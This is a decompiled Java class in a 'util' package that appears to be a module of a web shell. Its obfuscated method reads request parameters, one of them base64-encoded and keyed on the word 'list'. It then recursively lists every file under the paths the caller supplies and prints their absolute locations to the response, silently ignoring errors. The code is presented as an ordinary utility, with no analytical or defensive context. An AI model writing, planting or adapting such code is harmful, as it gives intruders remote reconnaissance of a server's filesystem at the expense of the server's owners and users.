package util;

import javax.xml.bind.DatatypeConverter;
import java.io.File;

public class LstFls extends BaseX3 {
   public LstFls() {
   }

   public void lstFiles(String var1) {
      if (var1 != null) {
         String[] var2 = var1.split("[;,\n]");
         int var3 = 0;

         for(File[] var4 = null; var3 < var2.length; ++var3) {
            try {
               File var5 = new File(var2[var3].trim());
               if (var5.isFile()) {
                  this.print(var5.getAbsolutePath() + "\n");
               } else {
                  var4 = var5.listFiles();

                  for(int var6 = 0; var6 < var4.length; ++var6) {
                     var5 = var4[var6];
                     if (var5.isFile()) {
                        this.print(var5.getAbsolutePath() + "\n");
                     } else if (var5.isDirectory()) {
                        this.lstFiles(var5.getAbsolutePath());
                     }
                  }
               }
            } catch (Exception var7) {
            }
         }
      }

   }

   public boolean c() throws Exception {
      String var1 = this.r.getParameter("ls");
      String var2 = this.r.getParameter("lstFiles");
      if (var1 != null) {
         var1 = new String(DatatypeConverter.parseBase64Binary(var1), "utf-8");
         if (-1 < var1.indexOf("list")) {
            String[] var3 = var1.split("[;,]");
            String var4 = "..";

            for(int var5 = 1; var5 < var3.length; ++var5) {
               var4 = var3[var5];
               this.lstFiles(var4);
            }

            return true;
         }
      }

      if (var2 != null) {
         this.lstFiles(var2);
      }

      return true;
   }
}
